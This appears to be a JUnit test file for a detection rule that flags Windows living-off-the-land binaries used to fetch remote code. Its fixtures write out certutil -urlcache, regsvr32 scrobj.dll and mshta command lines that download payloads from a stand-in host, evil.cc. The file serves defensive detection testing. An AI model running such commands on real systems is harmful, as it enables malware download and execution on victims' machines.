package com.viettelDigitalTalent.EntitiyManagement.correlation.rules;

import com.viettelDigitalTalent.EntitiyManagement.storage.mongodb.AuditLog;
import com.viettelDigitalTalent.EntitiyManagement.storage.mongodb.Incident;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.junit.jupiter.MockitoExtension;

import java.time.LocalDateTime;
import java.util.List;
import java.util.Map;
import java.util.Optional;

import static org.assertj.core.api.Assertions.assertThat;

@ExtendWith(MockitoExtension.class)
class LolBinRuleTest {

    private final LolBinRule rule = new LolBinRule();
    private final LocalDateTime NOW = LocalDateTime.now();

    private AuditLog log(String eventId, Map<String, Object> rawData) {
        AuditLog l = new AuditLog();
        l.setEventId(eventId);
        l.setRawData(rawData);
        return l;
    }

    private AuditLog processEvent(String processName, String commandLine) {
        return log("e-" + System.nanoTime(),
                Map.of("processName", processName, "commandLine", commandLine));
    }

    @Test
    void returnsEmptyWhenNoEvents() {
        Optional<Incident> result = rule.evaluate(List.of(), NOW);
        assertThat(result).isEmpty();
    }

    @Test
    void returnsEmptyWhenNoBinWithNetworkActivity() {
        // certutil.exe but no network-related flags
        AuditLog event = processEvent("certutil.exe", "certutil -decode encoded.b64 decoded.bin");
        Optional<Incident> result = rule.evaluate(List.of(event), NOW);
        assertThat(result).isEmpty();
    }

    @Test
    void returnsIncidentForCertutilUrlcache() {
        AuditLog event = processEvent("certutil.exe",
                "certutil.exe -urlcache -f http://evil.cc/x.exe C:\\Windows\\Temp\\x.exe");
        Optional<Incident> result = rule.evaluate(List.of(event), NOW);
        assertThat(result).isPresent();
        assertThat(result.get().getPatternName()).isEqualTo("LolBin");
    }

    @Test
    void returnsIncidentForRegsvr32Scrobj() {
        AuditLog event = processEvent("regsvr32.exe",
                "regsvr32.exe scrobj.dll /i:http://evil.cc/payload.sct /s");
        Optional<Incident> result = rule.evaluate(List.of(event), NOW);
        assertThat(result).isPresent();
        assertThat(result.get().getPatternName()).isEqualTo("LolBin");
    }

    @Test
    void returnsIncidentForMshtaHttp() {
        AuditLog event = processEvent("mshta.exe",
                "mshta.exe http://evil.cc/x.hta");
        Optional<Incident> result = rule.evaluate(List.of(event), NOW);
        assertThat(result).isPresent();
        assertThat(result.get().getPatternName()).isEqualTo("LolBin");
    }

    @Test
    void returnsEmptyWhenNoProcessName() {
        AuditLog event = log("e1", Map.of("commandLine", "certutil.exe -urlcache -f http://evil.cc/x.exe"));
        Optional<Incident> result = rule.evaluate(List.of(event), NOW);
        assertThat(result).isEmpty();
    }
}